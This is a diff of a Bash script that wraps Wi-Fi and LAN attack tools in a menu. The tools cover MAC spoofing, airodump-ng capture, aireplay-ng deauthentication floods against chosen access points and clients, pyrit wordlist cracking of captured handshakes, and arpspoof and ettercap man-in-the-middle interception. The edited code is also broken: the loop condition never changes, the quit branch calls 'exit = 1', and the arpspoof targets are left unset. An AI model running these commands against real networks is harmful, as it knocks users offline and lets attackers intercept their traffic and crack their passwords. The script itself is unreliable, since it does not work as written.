@@ -1,119 +1,122 @@
 #!/bin/bash
 clear
+exit=0
 
-#Functions and variables
-polo(){
-	echo "polo"
-}
-
-CURRENT_TARGET=""
-CURRENT_TARGET2=""
-
-auto_map(){
-	echo "Please wait. Scanning..."
-	n=0
-	targetIPs=()
-	for i in $( nmap -v -sn $(ipcalc $(ifconfig | grep "Bcast" | awk -F':' '{print $2}' | awk -F' ' '{print $1}') | grep "Network" | awk -F' ' '{print $2}')| grep -v "host down" | grep "Nmap scan report" | awk '{print $5}' )
-	do
-		targetIPs[$count]="$i"
-		targetIPs[$(( count+1 ))]=" "
-		count=$(( $count + 2 ))
-	done
+while [ exit != 2 ]; do
+	#Functions and variables
+	polo(){
+		echo "polo"
+	}
 	
-	CURRENT_TARGET=$( whiptail --menu "Select a target host:" 20 80 10 \
-		"${targetIPs[@]}" 3>&2 2>&1 1>&3- )
-	CURRENT_TARGET2=$( whiptail --menu "Select a target client:" 20 80 10 \
-		"${targetIPs[@]}" 3>&2 2>&1 1>&3- )
-}
-
-
-#Title Screen
-whiptail --textbox Title 25 35
-
-#Main Menu
-whiptail --menu "Main Menu" 25 50 7 \
-	macchange "MAC Changer" \
-	airodump "Airodump-ng + Airmon-ng" \
-	airodump2 "Airodump-ng bssid specific" \
-	aireplay "Aireplay-ng" \
-	pyrit "Pyrit (for caps)" \
-	arpspoof "arpspoof" \
-	ettercap "Open ettercap GUI" 2>CHOICE
-
-
-CHOICE=$(cat CHOICE)
-
-
-case $CHOICE in
-
-macchange) ifconfig eth0 down
-	ifconfig wlan0 down
-	macchanger -r eth0
-	macchanger -r wlan0
-	ifconfig eth0 up
-	ifconfig wlan0 up
-;;
-
-airodump) airmon-ng start wlan0
-	airodump-ng mon0
-;;
-
-airodump2) whiptail --inputbox "Please enter access point bssid:" 25 50 2>AIRODUMPBSSID 
-	AIRODUMPBSSID=$(cat AIRODUMPBSSID)
-	airodump-ng --bssid $AIRODUMPBSSID mon0
-;;
-
-aireplay) whiptail --inputbox "Please enter host bssid:" 25 50 2>AIREPLAYHOST
-	whiptail --inputbox "Please enter a client ("null" if no client):" 25 50 2>AIREPLAYCLIENT
-	AIREPLAYHOST=$(cat AIREPLAYHOST)
-	AIREPLAYCLIENT=$(cat AIREPLAYCLIENT)
-
-	xterm -e airodump-ng --bssid $AIREPLAYHOST -w Caps/BigProgram mon0 &
-	echo "Waiting for airodump to start..."
-	sleep 5s
+	CURRENT_TARGET=""
+	CURRENT_TARGET2=""
 	
-	if [ $AIREPLAYCLIENT != "null" ]; then
-		aireplay-ng --deauth 100 -a $AIREPLAYHOST -c $AIREPLAYCLIENT --ignore-negative-one mon0
-	else
-		aireplay-ng --deauth 100 -a $AIREPLAYHOST --ignore-negative-one mon0
-	fi
-;;
-
-pyrit) whiptail --inputbox "Please enter a cap file to crack:" 25 50 2>PYRITCAP
-	whiptail --inputbox "Please enter a wordlist:" 25 50 2>PYRITWORDLIST
+	auto_map(){
+		echo "Please wait. Scanning..."
+		n=0
+		targetIPs=()
+		for i in $( nmap -v -sn $(ipcalc $(ifconfig | grep "Bcast" | awk -F':' '{print $2}' | awk -F' ' '{print $1}') | grep "Network" | awk -F' ' '{print $2}')| grep -v "host down" | grep "Nmap scan report" | awk '{print $5}' )
+		do
+			targetIPs[$count]="$i"
+			targetIPs[$(( count+1 ))]=" "
+			count=$(( $count + 2 ))
+		done
+		
+		CURRENT_TARGET=$( whiptail --menu "Select a target host:" 20 80 10 \
+			"${targetIPs[@]}" 3>&2 2>&1 1>&3- )
+		CURRENT_TARGET2=$( whiptail --menu "Select a target client:" 20 80 10 \
+			"${targetIPs[@]}" 3>&2 2>&1 1>&3- )
+	}
 	
-	PYRITCAP=$(cat PYRITCAP)
-	PYRITWORDLIST=$(cat PYRITWORDLIST)
-
-	pyrit -r $PYRITCAP -i $PYRITWORDLIST attack_passthrough
-;;
-
-arpspoof)
-	auto_map
-	ARPSPOOFHOST=$CURRENT_TARGET
-	auto_map
-	ARPSPOOFCLIENT=$CURRENT_TARGET2
-
-	echo 1 > /proc/sys/net/ipv4/ip_forward
-	#ARPSPOOFHOST=$(cat ARPSPOOFHOST)
-	#ARPSPOOFCLIENT=$(cat ARPSPOOFCLIENT)
-
-	xterm -e arpspoof -i wlan0 -t $ARPSPOOFHOST $ARPSPOOFCLIENT &
-	xterm -e arpspoof -i wlan0 -t $ARPSPOOFCLIENT $ARPSPOOFHOST &
-
-	echo "Press enter to terminate..."
-	read enter
-	killall arpspoof
-;;
-
-ettercap) ettercap -G
-;;
-
-*) ehco "MAJOR ERROR, PLEASE RESTART"
-;;
-
-esac
-
+	
+	#Title Screen
+	whiptail --textbox Title 25 35
+	
+	#Main Menu
+	whiptail --menu "Main Menu" 25 50 7 \
+		macchange "MAC Changer" \
+		airodump "Airodump-ng + Airmon-ng" \
+		airodump2 "Airodump-ng bssid specific" \
+		aireplay "Aireplay-ng" \
+		pyrit "Pyrit (for caps)" \
+		arpspoof "arpspoof" \
+		ettercap "Open ettercap GUI" 2>CHOICE \
+		quit "Quit"
+	
+	
+	CHOICE=$(cat CHOICE)
+	
+	
+	case $CHOICE in
+	
+	macchange) ifconfig eth0 down
+		ifconfig wlan0 down
+		macchanger -r eth0
+		macchanger -r wlan0
+		ifconfig eth0 up
+		ifconfig wlan0 up
+	;;
+	
+	airodump) airmon-ng start wlan0
+		airodump-ng mon0
+	;;
+	
+	airodump2) whiptail --inputbox "Please enter access point bssid:" 25 50 2>AIRODUMPBSSID 
+		AIRODUMPBSSID=$(cat AIRODUMPBSSID)
+		airodump-ng --bssid $AIRODUMPBSSID mon0
+	;;
+	
+	aireplay) whiptail --inputbox "Please enter host bssid:" 25 50 2>AIREPLAYHOST
+		whiptail --inputbox "Please enter a client ("null" if no client):" 25 50 2>AIREPLAYCLIENT
+		AIREPLAYHOST=$(cat AIREPLAYHOST)
+		AIREPLAYCLIENT=$(cat AIREPLAYCLIENT)
+	
+		xterm -e airodump-ng --bssid $AIREPLAYHOST -w Caps/BigProgram mon0 &
+		echo "Waiting for airodump to start..."
+		sleep 5s
+		
+		if [ $AIREPLAYCLIENT != "null" ]; then
+			aireplay-ng --deauth 100 -a $AIREPLAYHOST -c $AIREPLAYCLIENT --ignore-negative-one mon0
+		else
+			aireplay-ng --deauth 100 -a $AIREPLAYHOST --ignore-negative-one mon0
+		fi
+	;;
+	
+	pyrit) whiptail --inputbox "Please enter a cap file to crack:" 25 50 2>PYRITCAP
+		whiptail --inputbox "Please enter a wordlist:" 25 50 2>PYRITWORDLIST
+		
+		PYRITCAP=$(cat PYRITCAP)
+		PYRITWORDLIST=$(cat PYRITWORDLIST)
+	
+		pyrit -r $PYRITCAP -i $PYRITWORDLIST attack_passthrough
+	;;
+	
+	arpspoof)
+		auto_map
+	
+		echo 1 > /proc/sys/net/ipv4/ip_forward
+		#ARPSPOOFHOST=$(cat ARPSPOOFHOST)
+		#ARPSPOOFCLIENT=$(cat ARPSPOOFCLIENT)
+	
+		xterm -e arpspoof -i wlan0 -t $ARPSPOOFHOST $ARPSPOOFCLIENT &
+		xterm -e arpspoof -i wlan0 -t $ARPSPOOFCLIENT $ARPSPOOFHOST &
+	
+		echo "Press enter to terminate..."
+		read enter
+		killall arpspoof
+	;;
+	
+	ettercap) ettercap -G
+	;;
+	
+	quit) exit = 1
+	;;
+	
+	*) ehco "MAJOR ERROR, PLEASE RESTART"
+	;;
+	
+	esac
+done
 
 
 
